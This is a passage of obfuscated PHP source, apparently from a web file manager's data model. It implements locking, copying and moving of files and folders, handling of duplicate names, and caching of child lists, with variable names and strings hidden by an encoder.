array($­ìÔ•ËŠ[562], $­ìÔ•ËŠ[558], $­ìÔ•ËŠ[559]), $×•¹Ü»); $this->_lockCheckEnd($­ìÔ•ËŠ[557], $ÆşúšíÄ); } public function lockMoveEnd($ÑÔ÷…å„) { $Ò´¸ÁÚ€ =& $_SERVER[ßğøİ]; if (!$this->allowLock()) { return; } $êş­ ÎÀ = 0; $this->_lockKey($Ò´¸ÁÚ€[561] . $ÑÔ÷…å„, $êş­ ÎÀ); $this->_lockEvent($ÑÔ÷…å„, array($Ò´¸ÁÚ€[555], $Ò´¸ÁÚ€[556]), $êş­ ÎÀ); $this->_lockParent($ÑÔ÷…å„, array($Ò´¸ÁÚ€[555], $Ò´¸ÁÚ€[557]), $êş­ ÎÀ); $this->_lockEvent($ÑÔ÷…å„, array($Ò´¸ÁÚ€[562], $Ò´¸ÁÚ€[558], $Ò´¸ÁÚ€[559]), $êş­ ÎÀ); } private function _lockCheck($ŠËäÛû¨, $úµ®¦ÑÎ) { $¿œ²¸Š§ =& $_SERVER[ßğøİ]; $¸³”Äàà = $this->sourceInfo($úµ®¦ÑÎ); $Ëí¾’­  = $ŠËäÛû¨ . $¿œ²¸Š§[10] . $úµ®¦ÑÎ; $this->_lockTimeStart[$Ëí¾’­ ] = timeFloat(); if (!is_array($¸³”Äàà)) { return; } $ğ²Î•ê = LNG($¿œ²¸Š§[563]); CacheLock::setErrorMsg($¿œ²¸Š§[162] . htmlspecialchars($¸³”Äàà[$¿œ²¸Š§[32]]) . $¿œ²¸Š§[164] . $ğ²Î•ê); $this->_lockKey($Ëí¾’­ , 1); $this->_lockKey($Ëí¾’­ , 0); $š°úÀƒ¸ = array_reverse($this->parentLevelArray($¸³”Äàà[$¿œ²¸Š§[521]])); foreach ($š°úÀƒ¸ as $Ïä§Ñõµ) { $Ëí¾’­  = $ŠËäÛû¨ . $¿œ²¸Š§[564] . $Ïä§Ñõµ; if (CacheLock::lockGet($¿œ²¸Š§[565] . $Ëí¾’­ )) { $¸³”Äàà = $this->sourceInfo($Ïä§Ñõµ); CacheLock::setErrorMsg($¿œ²¸Š§[162] . htmlspecialchars($¸³”Äàà[$¿œ²¸Š§[32]]) . $¿œ²¸Š§[164] . $ğ²Î•ê); $this->_lockKey($Ëí¾’­ , 1); $this->_lockKey($Ëí¾’­ , 0); } } } private function _lockCheckEnd($‘–•åê‚, $§‚ë™¶Õ) { $†İ˜Æ† =& $_SERVER[ßğøİ]; $õÊğ¡õª = $‘–•åê‚ . $†İ˜Æ†[10] . $§‚ë™¶Õ; CacheLock::setErrorMsg($†İ˜Æ†[378]); if (!isset($this->_lockTimeStart[$õÊğ¡õª])) { return; } $‘÷¼üÔ = timeFloat() - $this->_lockTimeStart[$õÊğ¡õª]; unset($this->_lockTimeStart[$õÊğ¡õª]); if ($‘÷¼üÔ > 0.5) { unset(self::$cacheSourceInfo[$†İ˜Æ†[460] . $§‚ë™¶Õ]); } $‰Õû¶®¹ = $this->sourceInfo($§‚ë™¶Õ); if (!$‰Õû¶®¹) { show_json(LNG($†İ˜Æ†[105]), !1); } } private function _lockParent($­…Ê¡âş, $¤¡‹ãÒ•, $¾óşı˜ª) { if (!$this->autoLockSet) { return; } $½÷íÌÄ = $this->sourceInfo($­…Ê¡âş); if (!is_array($½÷íÌÄ)) { return; } $‚øÕå = array_reverse($this->parentLevelArray($½÷íÌÄ[$_SERVER[ßğøİ][521]])); foreach ($‚øÕå as $æ€¾ñ¾”) { $this->_lockEvent($æ€¾ñ¾”, $¤¡‹ãÒ•, $¾óşı˜ª); } } private function _lockEvent($Òéü´û€, $ÙİÀíáğ, $ç‰ÌÛÒ¬) { $ÊÜ¯¨¹Œ =& $_SERVER[ßğøİ]; if (!$this->autoLockSet) { return; } foreach ($ÙİÀíáğ as $ı¡èÈÍ’) { $Ÿ£¨Ûä— = $ı¡èÈÍ’ . $ÊÜ¯¨¹Œ[10] . $Òéü´û€; if ($ç‰ÌÛÒ¬ && CacheLock::lockGet($ÊÜ¯¨¹Œ[565] . $Ÿ£¨Ûä—)) { continue; } $this->_lockKey($Ÿ£¨Ûä—, $ç‰ÌÛÒ¬); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ñÎ­‚¹, $ìË›£·š = 1) { $‰‰›Ü× = $_SERVER[ßğøİ][565] . md5($ñÎ­‚¹); if ($ìË›£·š) { if (isset(self::$_lockItemArr[$‰‰›Ü×])) { return; } self::$_lockItemArr[$‰‰›Ü×] = 1; CacheLock::lock($‰‰›Ü×, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$‰‰›Ü×])) { return; } unset(self::$_lockItemArr[$‰‰›Ü×]); CacheLock::unlock($‰‰›Ü×); } } public function isParentOf($€ƒ­æ©·, $ÀúšïÀ) { $À´³Ğ¥ä =& $_SERVER[ßğøİ]; $£Œ¢¿ = $this->sourceInfo($€ƒ­æ©·); $•¾ß¾¨ = $this->sourceInfo($ÀúšïÀ); $ª¢øß›¥ = $£Œ¢¿[$À´³Ğ¥ä[521]] . $£Œ¢¿[$À´³Ğ¥ä[402]] . $À´³Ğ¥ä[50]; $€±×İë§ = $•¾ß¾¨[$À´³Ğ¥ä[521]] . $•¾ß¾¨[$À´³Ğ¥ä[402]] . $À´³Ğ¥ä[50]; $ŞÌİ´¥ = strpos($€±×İë§, $ª¢øß›¥) === 0; return $ŞÌİ´¥; } private $targetIsDelete = 0; public function copy($¬¢Ñ™Áä, $ŠœõÌë», $ş£ÙñÖû = REPEAT_REPLACE, $‡§¾Ê½Õ = '') { $ñ—–šò¸ =& $_SERVER[ßğøİ]; $³ñ±™…‡ = $this->sourceInfo($¬¢Ñ™Áä); $‡¹º¥úá = $this->sourceInfo($ŠœõÌë»); if (!$³ñ±™…‡ || !$‡¹º¥úá || $‡¹º¥úá[$ñ—–šò¸[410]] != $ñ—–šò¸[88]) { return !1; } if ($this->isParentOf($¬¢Ñ™Áä, $ŠœõÌë»)) { return !1; } $Å±µ›¥Å = $‡§¾Ê½Õ ? $‡§¾Ê½Õ : $³ñ±™…‡[$ñ—–šò¸[32]]; $this->lockCopyStart($¬¢Ñ™Áä); $this->lockWriteStart($ŠœõÌë», $Å±µ›¥Å); $æšÏ‹Ø… = array($ñ—–šò¸[566] => array(), $ñ—–šò¸[567] => array(), $ñ—–šò¸[568] => array()); $this->targetIsDelete = intval($³ñ±™…‡[$ñ—–šò¸[431]]); $íåâÍÜ = $this->fileNameExistCache($ŠœõÌë», $³ñ±™…‡[$ñ—–šò¸[32]]); $‚¦¡Ó† = $this->_copy($¬¢Ñ™Áä, $ŠœõÌë», $ş£ÙñÖû, $æšÏ‹Ø…, !0, $‡§¾Ê½Õ); $this->_childrenListClear(); $this->lockCopyEnd($¬¢Ñ™Áä); $this->lockWriteEnd($ŠœõÌë», $Å±µ›¥Å); if ($³ñ±™…‡[$ñ—–šò¸[410]] == $ñ—–šò¸[88] && $íåâÍÜ == $‚¦¡Ó†) { $this->folderSizeResetChildren($íåâÍÜ); } Model($ñ—–šò¸[569])->addAll($æšÏ‹Ø…[$ñ—–šò¸[567]], array(), !0); if ($íåâÍÜ != $‚¦¡Ó† || $³ñ±™…‡[$ñ—–šò¸[410]] == $ñ—–šò¸[88]) { Model($ñ—–šò¸[570])->eventCopy($‚¦¡Ó†); } $this->saveAll($æšÏ‹Ø…[$ñ—–šò¸[568]]); Model($ñ—–šò¸[199])->linkAdd($æšÏ‹Ø…[$ñ—–šò¸[566]]); $this->folderSizeReset($ŠœõÌë»); $this->updateModifyTime($ŠœõÌë»); return $‚¦¡Ó†; } private function _copy($’Ü”ï, $åÇ»çñÕ, $Í³ÙöŞ, &$ŞÊËÏí×, $Ù†Ÿ˜¦, $¬²é¿Ÿ = '') { $½‚ˆ¼ş¦ =& $_SERVER[ßğøİ]; $ÖíŸ”Ù = $this->sourceInfoCache($’Ü”ï); $î¡÷†³ = $ÖíŸ”Ù[$½‚ˆ¼ş¦[410]] == $½‚ˆ¼ş¦[88]; $Ù¶À±Ã = $¬²é¿Ÿ ? $¬²é¿Ÿ : $ÖíŸ”Ù[$½‚ˆ¼ş¦[32]]; $™Ÿº‹ê = $this->fileNameExistCache($åÇ»çñÕ, $Ù¶À±Ã); if ($Ù†Ÿ˜¦) { $this->_childrenAllMake($’Ü”ï); if ($î¡÷†³ && $™Ÿº‹ê) { $this->_childrenAllMake($™Ÿº‹ê); } } if (!$™Ÿº‹ê) { return $this->_copyCreate($’Ü”ï, $åÇ»çñÕ, $Ù¶À±Ã, $ŞÊËÏí×); } $‰Öáª†á = $™Ÿº‹ê; if ($î¡÷†³) { if ($Í³ÙöŞ == REPEAT_RENAME_FOLDER) { $Ù¶À±Ã = $this->fileNameAutoCache($åÇ»çñÕ, $Ù¶À±Ã, $Í³ÙöŞ, $î¡÷†³); $‰Öáª†á = $this->_copyCreate($’Ü”ï, $åÇ»çñÕ, $Ù¶À±Ã, $ŞÊËÏí×); } else { $î¡á­ñ = $this->_childrenList($’Ü”ï); foreach ($î¡á­ñ as $…€ÙÔı¥) { $this->_copy($…€ÙÔı¥[$½‚ˆ¼ş¦[402]], $™Ÿº‹ê, $Í³ÙöŞ, $ŞÊËÏí×, !1); } } } else { if ($Í³ÙöŞ == REPEAT_RENAME || $Í³ÙöŞ == REPEAT_RENAME_FOLDER) { $Ù¶À±Ã = $this->fileNameAutoCache($åÇ»çñÕ, $Ù¶À±Ã, $Í³ÙöŞ, $î¡÷†³); $‰Öáª†á = $this->_copyCreate($’Ü”ï, $åÇ»çñÕ, $Ù¶À±Ã, $ŞÊËÏí×); } else { if ($Í³ÙöŞ == REPEAT_REPLACE) { $àÔç·»¬ = $this->sourceInfoCache($™Ÿº‹ê); $”¶¬³Ø­ = $this->fileHistory($àÔç·»¬, $ÖíŸ”Ù[$½‚ˆ¼ş¦[468]], $ÖíŸ”Ù[$½‚ˆ¼ş¦[76]]); if ($”¶¬³Ø­) { $ŞÊËÏí×[$½‚ˆ¼ş¦[566]][] = $ÖíŸ”Ù[$½‚ˆ¼ş¦[468]]; } } else { if ($Í³ÙöŞ == REPEAT_SKIP) { } } } Hook::trigger($½‚ˆ¼ş¦[571], array($½‚ˆ¼ş¦[572], $ÖíŸ”Ù, 0)); } return $‰Öáª†á; } private function _copyCreate($¢­ Í¦‰, $Ş¢ÇÅĞÁ, $™óİ×áÁ, &$¶ç›ğ´á) { $ÆÒÍ¸•¯ =& $_SERVER[ßğøİ]; $ïŠË¥†¬ = $this->sourceInfoCache($¢­ Í¦‰); $ºÔÁ¤ñ = $this->sourceInfoCache($Ş¢ÇÅĞÁ); $¼Ê‡ï±ş = $this->_makeItemData($ïŠË¥†¬, $ºÔÁ¤ñ, $™óİ×áÁ); Hook::trigger($ÆÒÍ¸•¯[573], $¼Ê‡ï±ş); Hook::trigger($ÆÒÍ¸•¯[574], array($ÆÒÍ¸•¯[575], $¼Ê‡ï±ş, 0)); $‘Û‰Ó¥ô = $this->add($¼Ê‡ï±ş); $†š®Úñ = array($ÆÒÍ¸•¯[402] => $‘Û‰Ó¥ô, $ÆÒÍ¸•¯[32] => $™óİ×áÁ); $this->_copyApplyMeta($†š®Úñ, $¶ç›ğ´á); if ($ïŠË¥†¬[$ÆÒÍ¸•¯[410]] != $ÆÒÍ¸•¯[88]) { $¶ç›ğ´á[$ÆÒÍ¸•¯[566]][] = $ïŠË¥†¬[$ÆÒÍ¸•¯[468]]; return $‘Û‰Ó¥ô; } $½ˆ½¾İœ = array(); $™ß‹û®ä = array(); $this->_childrenListAll($¢­ Í¦‰, $½ˆ½¾İœ); $Ìà´ùÕ = count($½ˆ½¾İœ); if ($Ìà´ùÕ == 0) { return $‘Û‰Ó¥ô; } $¯Ñ¬Ïí = $this->sourceInfo($‘Û‰Ó¥ô); foreach ($½ˆ½¾İœ as $»üşß®) { $£ç–®Ñí = $this->_makeItemData($»üşß®, $¯Ñ¬Ïí, $»üşß®[$ÆÒÍ¸•¯[32]]); $£ç–®Ñí[$ÆÒÍ¸•¯[521]] = $»üşß®[$ÆÒÍ¸•¯[521]]; $™ß‹û®ä[] = $£ç–®Ñí; } $this->chunkEventSet($ÆÒÍ¸•¯[576], array($ÆÒÍ¸•¯[577], $¼Ê‡ï±ş, $Ìà´ùÕ)); $this->addAll($™ß‹û®ä, array(), !1); $ì¯Õ¿–Ó = $this->where(array($ÆÒÍ¸•¯[432] => $‘Û‰Ó¥ô))->select(); $¨æğè‰» = $this->_childrenMakeRelation($½ˆ½¾İœ, $ì¯Õ¿–Ó); $¨æğè‰»[$¢­ Í¦‰] = $‘Û‰Ó¥ô; $™¢è“” = array(); $¹Ø•—ø = array(); foreach ($ì¯Õ¿–Ó as $»üşß®) { $ÈÉ©ÈØ = $»üşß®[$ÆÒÍ¸•¯[402]]; $’Ëü²Û = $this->_childrenMatch($¨æğè‰», $»üşß®, $¯Ñ¬Ïí); $™¢è“”[] = array($ÆÒÍ¸•¯[402], $ÈÉ©ÈØ, $ÆÒÍ¸•¯[432], $’Ëü²Û[$ÆÒÍ¸•¯[432]]); $¹Ø•—ø[] = array($ÆÒÍ¸•¯[402], $ÈÉ©ÈØ, $ÆÒÍ¸•¯[521], $’Ëü²Û[$ÆÒÍ¸•¯[521]]); $this->_copyApplyMeta($»üşß®, $¶ç›ğ´á); if ($»üşß®[$ÆÒÍ¸•¯[410]] != $ÆÒÍ¸•¯[88]) { $¶ç›ğ´á[$ÆÒÍ¸•¯[566]][] = $»üşß®[$ÆÒÍ¸•¯[468]]; } } $this->chunkEventSet($ÆÒÍ¸•¯[578], array($ÆÒÍ¸•¯[579], $¼Ê‡ï±ş, $Ìà´ùÕ)); $this->saveAll($™¢è“”); $this->chunkEventSet($ÆÒÍ¸•¯[580], array($ÆÒÍ¸•¯[581], $¼Ê‡ï±ş, $Ìà´ùÕ)); $this->saveAll($¹Ø•—ø); return $‘Û‰Ó¥ô; } private function _childrenMakeRelation($¡ÃÒêñ, $³“Ñâéé) { $±®›Ù =& $_SERVER[ßğøİ]; $’ÂÉï“ã = array(); $˜éŸ¦Ö“ = array(); foreach ($¡ÃÒêñ as $–í÷¤Ê¦) { $Œù™Œ’ = $–í÷¤Ê¦[$±®›Ù[32]] . $±®›Ù[8] . $–í÷¤Ê¦[$±®›Ù[521]]; $’ÂÉï“ã[$Œù™Œ’] = $–í÷¤Ê¦[$±®›Ù[402]]; } foreach ($³“Ñâéé as $–í÷¤Ê¦) { $Œù™Œ’ = $–í÷¤Ê¦[$±®›Ù[32]] . $±®›Ù[8] . $–í÷¤Ê¦[$±®›Ù[521]]; $£Ü¡Òëó = $’ÂÉï“ã[$Œù™Œ’]; $˜éŸ¦Ö“[$£Ü¡Òëó] = $–í÷¤Ê¦[$±®›Ù[402]]; } return $˜éŸ¦Ö“; } private function _childrenMatch($—×ó¼â¯, $§ÕÌÊóè, $¦•úïÄ) { $àâİâõ =& $_SERVER[ßğøİ]; $á×ìÃË = $¦•úïÄ[$àâİâõ[521]]; $ÚÙ˜æŞã = $this->parentLevelArray($§ÕÌÊóè[$àâİâõ[521]]); foreach ($ÚÙ˜æŞã as $ÉÒ«÷ë†) { if (isset($—×ó¼â¯[$ÉÒ«÷ë†])) { $á×ìÃË .= $—×ó¼â¯[$ÉÒ«÷ë†] . $àâİâõ[582]; } } $á×ìÃË = rtrim($á×ìÃË, $àâİâõ[50]) . $àâİâõ[50]; $¥ûÓ¼‘Œ = $this->parentLevelArray($á×ìÃË); $şíšêÆ‘ = $¥ûÓ¼‘Œ[count($¥ûÓ¼‘Œ) - 1]; return array($àâİâõ[432] => $şíšêÆ‘, $àâİâõ[521] => $á×ìÃË); } private function _makeItemData($Æ‡™±¶, $ÑßºŒ–Ä, $ìğšÚ×ù) { $îæ¨ëÔ· =& $_SERVER[ßğøİ]; $Ãß¢•„— = array($îæ¨ëÔ·[583] => $Æ‡™±¶[$îæ¨ëÔ·[410]], $îæ¨ëÔ·[420] => $ìğšÚ×ù, $îæ¨ëÔ·[584] => $Æ‡™±¶[$îæ¨ëÔ·[412]] ? $Æ‡™±¶[$îæ¨ëÔ·[412]] : $îæ¨ëÔ·[12], $îæ¨ëÔ·[469] => $Æ‡™±¶[$îæ¨ëÔ·[468]] ? $Æ‡™±¶[$îæ¨ëÔ·[468]] : 0, $îæ¨ëÔ·[585] => $Æ‡™±¶[$îæ¨ëÔ·[76]] ? $Æ‡™±¶[$îæ¨ëÔ·[76]] : 0, $îæ¨ëÔ·[586] => intval($ÑßºŒ–Ä[$îæ¨ëÔ·[411]]), $îæ¨ëÔ·[587] => intval($ÑßºŒ–Ä[$îæ¨ëÔ·[505]]), $îæ¨ëÔ·[588] => intval(USER_ID), $îæ¨ëÔ·[589] => intval(USER_ID), $îæ¨ëÔ·[401] => intval($ÑßºŒ–Ä[$îæ¨ëÔ·[402]]), $îæ¨ëÔ·[590] => $ÑßºŒ–Ä[$îæ¨ëÔ·[521]] . $ÑßºŒ–Ä[$îæ¨ëÔ·[402]] . $îæ¨ëÔ·[50], $îæ¨ëÔ·[424] => $Æ‡™±¶[$îæ¨ëÔ·[85]] ? $Æ‡™±¶[$îæ¨ëÔ·[85]] : time(), $îæ¨ëÔ·[430] => 0, $îæ¨ëÔ·[591] => $îæ¨ëÔ·[12]); return $Ãß¢•„—; } private function _copyApplyMeta($œÖœòÎ, &$ñƒü•‰Ò) { $Ä®½¤® =& $_SERVER[ßğøİ]; $î‹÷¸Û = $œÖœòÎ[$Ä®½¤®[402]]; $ÕãÁ”æ = $œÖœòÎ[$Ä®½¤®[32]]; if (!isset($œÖœòÎ[$Ä®½¤®[592]]) || !$œÖœòÎ[$Ä®½¤®[592]] || $œÖœòÎ[$Ä®½¤®[592]] == $Ä®½¤®[197]) { $ñƒü•‰Ò[$Ä®½¤®[568]][] = array($Ä®½¤®[402], $î‹÷¸Û, $Ä®½¤®[592], short_id($î‹÷¸Û)); } if (Input::check($ÕãÁ”æ, $Ä®½¤®[593])) { $ñƒü•‰Ò[$Ä®½¤®[567]][] = array($Ä®½¤®[402] => $î‹÷¸Û, $Ä®½¤®[94] => $Ä®½¤®[465], $Ä®½¤®[374] => str_replace($Ä®½¤®[53], $Ä®½¤®[12], Pinyin::get($ÕãÁ”æ))); $ñƒü•‰Ò[$Ä®½¤®[567]][] = array($Ä®½¤®[402] => $î‹÷¸Û, $Ä®½¤®[94] => $Ä®½¤®[464], $Ä®½¤®[374] => Pinyin::get($ÕãÁ”æ, $Ä®½¤®[594])); } $ñƒü•‰Ò[$Ä®½¤®[567]][] = array($Ä®½¤®[402] => $î‹÷¸Û, $Ä®½¤®[94] => $Ä®½¤®[444], $Ä®½¤®[374] => KodSort::makeStr($ÕãÁ”æ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($‚èĞ¡ó) { $—´Ù¥Š’ =& $_SERVER[ßğøİ]; $ˆ¾®ÛÊ = $this->sourceInfo($‚èĞ¡ó); $Î¢¢¸ı¶ = $—´Ù¥Š’[595]; $ú¨ÍÂÆ› = array($—´Ù¥Š’[521] => array($—´Ù¥Š’[550], $ˆ¾®ÛÊ[$—´Ù¥Š’[521]] . $‚èĞ¡ó . $—´Ù¥Š’[551]), $—´Ù¥Š’[431] => $this->targetIsDelete); $óîØ¿Ûé = $this->field($Î¢¢¸ı¶)->where($ú¨ÍÂÆ›)->select(); if (!$óîØ¿Ûé) { return; } $óîØ¿Ûé = array_to_keyvalue($óîØ¿Ûé, $—´Ù¥Š’[402]); foreach ($óîØ¿Ûé as $Á«­÷Õ°) { $ÔÁ§Ò› = $Á«­÷Õ°[$—´Ù¥Š’[432]]; $‚èĞ¡ó = $Á«­÷Õ°[$—´Ù¥Š’[402]]; if (!isset($this->_childrenListCache[$‚èĞ¡ó]) && $Á«­÷Õ°[$—´Ù¥Š’[410]] == $—´Ù¥Š’[88]) { $this->_childrenListCache[$‚èĞ¡ó] = array(); } if (!isset($this->_childrenListCache[$ÔÁ§Ò›])) { $this->_childrenListCache[$ÔÁ§Ò›] = array(); } $this->_childrenListCache[$ÔÁ§Ò›][$‚èĞ¡ó] = $Á«­÷Õ°; $this->_childrenItemCache[$‚èĞ¡ó] = $Á«­÷Õ°; } } private function _childrenListAll($‚ª­îî», &$…‹¸»½) { $Â¾Ä·ñü =& $_SERVER[ßğøİ]; if (!isset($this->_childrenListCache[$‚ª­îî»])) { return; } $´¢Ê™«Ç = $this->_childrenListCache[$‚ª­îî»]; foreach ($´¢Ê™«Ç as $å€€¨× => $õ¾íœİ) { $…‹¸»½[$å€€¨×] = $õ¾íœİ; if ($õ¾íœİ[$Â¾Ä·ñü[410]] == $Â¾Ä·ñü[88]) { $this->_childrenListAll($å€€¨×, $…‹¸»½); } } } private function sourceInfoCache($Àß÷ÃæÜ) { if (isset($this->_childrenItemCache[$Àß÷ÃæÜ])) { return $this->_childrenItemCache[$Àß÷ÃæÜ]; } return $this->sourceInfo($Àß÷ÃæÜ); } private function _childrenList($È¯¦ù) { if (isset($this->_childrenListCache[$È¯¦ù])) { return $this->_childrenListCache[$È¯¦ù]; } return $this->_childrenListSelect($È¯¦ù); } private function _childrenListSelect($•‹‘ñ˜) { $åÃˆá§Ğ =& $_SERVER[ßğøİ]; $Õ®©ÓÏ× = array($åÃˆá§Ğ[432] => $•‹‘ñ˜, $åÃˆá§Ğ[431] => $this->targetIsDelete); $äş©Êª = $this->where($Õ®©ÓÏ×)->select(); $äş©Êª = $äş©Êª ? $äş©Êª : array(); $è¢Î×î‘ = array_to_keyvalue($äş©Êª, $åÃˆá§Ğ[402]); $this->_childrenListCache[$•‹‘ñ˜] = $è¢Î×î‘; foreach ($è¢Î×î‘ as $•‹‘ñ˜ => $²Äà¯ñ) { $this->_childrenItemCache[$•‹‘ñ˜] = $²Äà¯ñ; } return $è¢Î×î‘; } private function fileNameExistCache($çØ©œí¶, $ï÷ƒéÕÒ) { $§Ûé¬×œ =& $_SERVER[ßğøİ]; $ï÷ƒéÕÒ = strtolower($ï÷ƒéÕÒ); $ÌÙ„“´‡ = $this->_childrenList($çØ©œí¶); foreach ($ÌÙ„“´‡ as $§„äı…É) { if ($ï÷ƒéÕÒ == strtolower($§„äı…É[$§Ûé¬×œ[32]])) { return $§„äı…É[$§Ûé¬×œ[402]]; } } return !1; } private function fileNameAutoCache($˜°ƒ–ë¯, $»ñâÎ¡‰, $°ÛØ’‹, $¨¾îìÏÛ) { $¾ù£Õø =& $_SERVER[ßğøİ]; $µáº›ı† = $this->_childrenList($˜°ƒ–ë¯); $«¾“€ä = array_to_keyvalue($µáº›ı†, $¾ù£Õø[12], $¾ù£Õø[32]); return $this->fileNameAutoGet($«¾“€ä, $»ñâÎ¡‰, $°ÛØ’‹, $¨¾îìÏÛ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($€Ÿ§ˆû–, $€şüº“ù, $Üß¦š = REPEAT_REPLACE, $Ï˜ı©Öˆ = '') { $Ï‡ÍÚ½æ =& $_SERVER[ßğøİ]; $¯¼¯Òı´ = $this->sourceInfo($€Ÿ§ˆû–); $Çˆ·ƒ—İ = $this->sourceInfo($€şüº“ù); if ($¯¼¯Òı´[$Ï‡ÍÚ½æ[432]] == $Çˆ·ƒ—İ[$Ï‡ÍÚ½æ[402]]) { if ($¯¼¯Òı´[$Ï‡ÍÚ½æ[431]] == $Ï‡ÍÚ½æ[88]) { Model($Ï‡ÍÚ½æ[429])->restore(array($€Ÿ§ˆû–)); } if (!$Ï˜ı©Öˆ || $Ï˜ı©Öˆ == $¯¼¯Òı´[$Ï‡ÍÚ½æ[32]]) { return $€Ÿ§ˆû–; } } $ûû°‹É² = $this->pathInfoMore($€Ÿ§ˆû–); if ($this->isParentOf($€Ÿ§ˆû–, $€şüº“ù)) { return !1; } if (!$¯¼¯Òı´ || !$Çˆ·ƒ—İ || $Çˆ·ƒ—İ[$Ï‡ÍÚ½æ[410]] != $Ï‡ÍÚ½æ[88]) { return !1; } Hook::trigger($Ï‡ÍÚ½æ[596], $ûû°‹É²); $this->targetIsDelete = intval($¯¼¯Òı´[$Ï‡ÍÚ½æ[431]]); if ($¯¼¯Òı´[$Ï‡ÍÚ½æ[432]] == $€şüº“ù && $Ï˜ı©Öˆ != $¯¼¯Òı´[$Ï‡ÍÚ½æ[32]]) { $ş¡Î×•¨ = $this->fileNameExist($€şüº“ù, $Ï˜ı©Öˆ); if ($ş¡Î×•¨ && $¯¼¯Òı´[$Ï‡ÍÚ½æ[410]] == $Ï‡ÍÚ½æ[197]) { $®«Ôû¶ = $this->sourceInfo($ş¡Î×•¨); $¯›ÖÈìä = $this->fileHistory($®«Ôû¶, $¯¼¯Òı´[$Ï‡ÍÚ½æ[468]], $¯¼¯Òı´[$Ï‡ÍÚ½æ[76]]); if (!$¯›ÖÈìä) { Model($Ï‡ÍÚ½æ[471])->remove($¯¼¯Òı´[$Ï‡ÍÚ½æ[468]]); } $this->removeNow($€Ÿ§ˆû–, !1); $this->folderSizeReset($€şüº“ù); Hook::trigger($Ï‡ÍÚ½æ[597], $ûû°‹É²); return $ş¡Î×•¨; } } $­»¢ûÇ = $Ï˜ı©Öˆ ? $Ï˜ı©Öˆ : $¯¼¯Òı´[$Ï‡ÍÚ½æ[32]]; $this->lockMoveStart($€Ÿ§ˆû–); $this->lockWriteStart($€şüº“ù, $­»¢ûÇ); $»¼«ş–Æ = array($Ï‡ÍÚ½æ[566] => array(), $Ï‡ÍÚ½æ[598] => !1); $this->clearShare($€Ÿ§ˆû–, $€şüº“ù); $·Èƒğİş = $this->fileNameExistCache($€şüº“ù, $¯¼¯Òı´[$Ï‡ÍÚ½æ[32]]); $Ñ²ìÑ¿– = $this->_move($€Ÿ§ˆû–, $€şüº“ù, $Üß¦š, $»¼«ş–Æ, $Ï˜ı©Öˆ); $this->sourceCacheClear(); if ($¯¼¯Òı´[$Ï‡ÍÚ½æ[410]] == $Ï‡ÍÚ½æ[88] && $·Èƒğİş) { $this->folderSizeResetChildren($Ñ²ìÑ¿–); } Model($Ï‡ÍÚ½æ[199])->linkAdd($»¼«ş–Æ[$Ï‡ÍÚ½æ[566]]); if ($·Èƒğİş && $»¼«ş–Æ[$Ï‡ÍÚ½æ[598]]) { $this->removeNow($€Ÿ§ˆû–, !1); } $this->lockMoveEnd($€Ÿ§ˆû–); $this->lockWriteEnd($€şüº“ù, $­»¢ûÇ); $this->folderSizeReset($¯¼¯Òı´[$Ï‡ÍÚ½æ[432]]); $this->folderSizeReset($€şüº“ù); $Ğ‹°êÖ = array($¯¼¯Òı´[$Ï‡ÍÚ½æ[432]], $€şüº“ù); if ($¯¼¯Òı´[$Ï‡ÍÚ½æ[410]] == $Ï‡ÍÚ½æ[88]) { $Ğ‹°êÖ[] = $€Ÿ§ˆû–; } $this->updateModifyTime($Ğ‹°êÖ); Model($Ï‡ÍÚ½æ[570])->eventMove($€Ÿ§ˆû–, $¯¼¯Òı´[$Ï‡ÍÚ½æ[432]], $€şüº“ù); Hook::trigger($Ï‡ÍÚ½æ[597], $ûû°‹É²); return $Ñ²ìÑ¿–; } private function _move($‡Š³ª„ª, $â¦„£Û, $ŸÅÓ‹ƒ, &$ßÍ¶½Ö¤, $ìôÃæÑ³ = '') { $êÂè®û— =& $_SERVER[ßğøİ]; $áÆ´‰¯ë = $this->sourceInfo($‡Š³ª„ª); $÷šÕõÆº = $áÆ´‰¯ë[$êÂè®û—[410]] == $êÂè®û—[88]; $Î¿ıı«î = $ìôÃæÑ³ ? $ìôÃæÑ³ : $áÆ´‰¯ë[$êÂè®û—[32]]; $Ö‹ÍÓéµ = $this->fileNameExistCache($â¦„£Û, $Î¿ıı«î); $this->lockMoveStart($‡Š³ª„ª); $this->lockWriteStart($â¦„£Û, $Î¿ıı«î); if (!$Ö‹ÍÓéµ) { return $this->_moveForce($‡Š³ª„ª, $â¦„£Û, $Î¿ıı«î); } $±¸òã¬ü = $Ö‹ÍÓéµ; $ªúöÄ¬ã = !1; if ($÷šÕõÆº) { if ($ŸÅÓ‹ƒ == REPEAT_RENAME_FOLDER) { $Î¿ıı«î = $this->fileNameAuto($â¦„£Û, $Î¿ıı«î, $ŸÅÓ‹ƒ, $÷šÕõÆº); $±¸òã¬ü = $this->_moveForce($‡Š³ª„ª, $â¦„£Û, $Î¿ıı«î); } else { if ($ŸÅÓ‹ƒ == REPEAT_RENAME_FOLDER) { $ŸÅÓ‹ƒ = REPEAT_RENAME; } $‡°…¸ = $this->_childrenListSelect($‡Š³ª„ª); foreach ($‡°…¸ as $ô°şñÅ¬) { $this->_move($ô°şñÅ¬[$êÂè®û—[402]], $Ö‹ÍÓéµ, $ŸÅÓ‹ƒ, $ßÍ¶½Ö¤); } $ªúöÄ¬ã = !0; } } else { if ($ŸÅÓ‹ƒ == REPEAT_SKIP) { $ªúöÄ¬ã = !0; } else { if ($ŸÅÓ‹ƒ == REPEAT_RENAME || $ŸÅÓ‹ƒ == REPEAT_RENAME_FOLDER) { $Î¿ıı«î = $this->fileNameAuto($â¦„£Û, $Î¿ıı«î, $ŸÅÓ‹ƒ, $÷šÕõÆº); $±¸òã¬ü = $this->_moveForce($‡Š³ª„ª, $â¦„£Û, $Î¿ıı«î); } else { if ($ŸÅÓ‹ƒ == REPEAT_REPLACE) { $¼ƒÆÛáÔ = $this->sourceInfoCache($Ö‹ÍÓéµ); $ê‘î¾¡” = $this->fileHistory($¼ƒÆÛáÔ, $áÆ´‰¯ë[$êÂè®û—[468]], $áÆ´‰¯ë[$êÂè®û—[76]]); $ªúöÄ¬ã = !0; if ($ê‘î¾¡”) { $ßÍ¶½Ö¤[$êÂè®û—[566]][] = 